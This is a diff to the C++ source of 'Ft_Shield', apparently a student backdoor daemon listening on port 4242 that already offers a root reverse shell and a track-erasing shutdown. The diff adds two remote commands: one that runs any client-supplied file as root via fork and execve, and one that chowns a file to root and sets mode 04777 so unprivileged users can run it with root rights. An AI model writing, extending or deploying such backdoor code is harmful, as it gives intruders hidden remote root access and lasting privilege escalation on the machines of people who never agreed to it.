@@ -53,6 +53,8 @@ Ft_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _maxfd(2),
 	this->_cmdMap["rev\n"]		= &Ft_Shield::_reverseShell;
 	this->_cmdMap["quit\n"]		= &Ft_Shield::_disconnect;
 	this->_cmdMap["help\n"]		= &Ft_Shield::_help;
+	this->_cmdMap["elfAsRoot\n"]= &Ft_Shield::_elfAsRoot;
+	this->_cmdMap["rootLike\n"]	= &Ft_Shield::_rootLike;
 	return;
 }
 
@@ -384,8 +386,10 @@ void	Ft_Shield::_help(int fd)
 
 	help = "ft_shield list of commands:\n";
 	help += "\t- shutdown : terminate ft_shield and erase tracks\n";
-	help += "\t- rev      : open a shell with root rights\n";
 	help += "\t- quit     : disconnect you from ft_shield\n";
+	help += "\t- rev      : open a shell with root rights\n";
+	help += "\t- elfAsRoot: run any file with root priviliges\n";
+	help += "\t- rootLike : modify file permissions to run an elf as root by a non priviliged user\n";
 	send(fd, help.c_str(), help.length(), 0);
 	return;
 }
@@ -451,14 +455,17 @@ int	Ft_Shield::_password(int fd)
 /*
  * Run any file as root after checking the file exists 
  */
-void	Ft_shield::_elfAsRoot(int fd)
+void	Ft_Shield::_elfAsRoot(int fd)
 {
 	int				pid = 0;
 	int				res = 0;
-	char			buf_char[100] = {'\0'};
+	char			char_buf[100] = {'\0'};
 	unsigned int	time = 0;
+	char			*file[2];
 
-	this->_buffer = "You have 10s to enter the absolute file path:\n"
+	file[0] = char_buf;
+	file[1] = NULL;
+	this->_buffer = "You have 10s to enter the absolute file path:\n";
 	send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
 	while (res <= 0 && time < 10)
 	{
@@ -475,16 +482,17 @@ void	Ft_shield::_elfAsRoot(int fd)
 	}
 	else
 	{
-		if (access(buf_char, F_OK) != -1)
+		char_buf[res - 1] = '\0';
+		if (access(char_buf, F_OK) != -1)
 		{
 			pid = fork();
 			if (pid == 0)
-				execve(buf_char, {buf_char, NULL}, NULL);
+				execve(file[0], file, NULL);
 			else
 				this->_buffer = "Program launched.\n";
 		}
 		else
-			this->_buffer = "Error: no such file.\n"
+			this->_buffer = "Error: no such file.\n";
 		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
 	}
 	return;
@@ -495,3 +503,35 @@ void	Ft_shield::_elfAsRoot(int fd)
  * Set the setuid bit for the selected file
  * In other words, any unprivileged user would be able to launch the program as root
  */
+void	Ft_Shield::_rootLike(int fd)
+{
+	int				res = 0;
+	char			char_buf[100] = {'\0'};
+	unsigned int	time = 0;
+
+	this->_buffer = "You have 10s to enter the absolute file path:\n";
+	send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
+	while (res <= 0 && time < 10)
+	{
+		res = recv(fd, char_buf, 99, MSG_PEEK | MSG_DONTWAIT);
+		sleep(1);
+		time++;
+	}
+	res = recv(fd, char_buf, 99, MSG_DONTWAIT);
+	if (res <= 0)
+	{
+		this->_buffer = "Sorry, time elapsed.\n";
+		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
+		return;
+	}
+	else
+	{
+		char_buf[res - 1] = '\0';
+		if (chown(char_buf, 0, 0) == 0 && chmod(char_buf, 04777) == 0)
+			this->_buffer = "Setuid bit correctly set.\n";
+		else
+			this->_buffer = "Error: no suche file.\n";
+		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
+	}
+	return;
+}
